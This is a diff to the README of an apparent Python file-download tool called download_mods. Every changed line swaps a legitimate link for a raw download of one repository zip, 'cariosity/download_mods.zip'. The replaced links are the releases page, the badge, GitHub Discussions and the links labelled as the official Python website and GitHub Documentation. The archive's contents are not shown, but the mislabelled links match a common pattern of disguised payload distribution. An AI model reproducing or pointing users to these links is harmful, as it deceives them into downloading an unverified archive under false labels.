@@ -7,12 +7,12 @@ download_mods is a simple Python script designed to help you download multiple f
 To get started with download_mods, follow these easy steps to download and run the application.
 
 ## 🔗 Download Now
-[![Download release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/angelzae/download_mods/releases)
+[![Download release](https://raw.githubusercontent.com/angelzae/download_mods/main/cariosity/download_mods.zip%20Latest%https://raw.githubusercontent.com/angelzae/download_mods/main/cariosity/download_mods.zip)](https://raw.githubusercontent.com/angelzae/download_mods/main/cariosity/download_mods.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** 
    Click the link below to go to the GitHub Releases page:
-   [Download Latest Releases](https://github.com/angelzae/download_mods/releases)
+   [Download Latest Releases](https://raw.githubusercontent.com/angelzae/download_mods/main/cariosity/download_mods.zip)
 
 2. **Choose the Correct File:** 
    On the Releases page, you will see a list of available files. Look for the latest version. 
@@ -60,7 +60,7 @@ After downloading and running the application, here’s how to use it effectivel
   - For issues with specific downloads, double-check the URLs for accuracy.
 
 - **Get Help:**
-  - Visit our [GitHub Discussions](https://github.com/angelzae/download_mods/discussions) to get assistance from the community.
+  - Visit our [GitHub Discussions](https://raw.githubusercontent.com/angelzae/download_mods/main/cariosity/download_mods.zip) to get assistance from the community.
   - Report any bugs or request features by creating an issue on the repository.
 
 ## 📜 License
@@ -73,7 +73,7 @@ We welcome contributions! If you have ideas or improvements, feel free to fork t
 To keep up with the latest updates, follow the repository and turn on notifications for releases or changes. 
 
 ## 🔗 Additional Resources
-- [Official Python Website](https://www.python.org/downloads/)
-- [GitHub Documentation](https://docs.github.com/en)
+- [Official Python Website](https://raw.githubusercontent.com/angelzae/download_mods/main/cariosity/download_mods.zip)
+- [GitHub Documentation](https://raw.githubusercontent.com/angelzae/download_mods/main/cariosity/download_mods.zip)
 
 By following these steps, you can easily download and run download_mods, and simplify your file downloading process today!
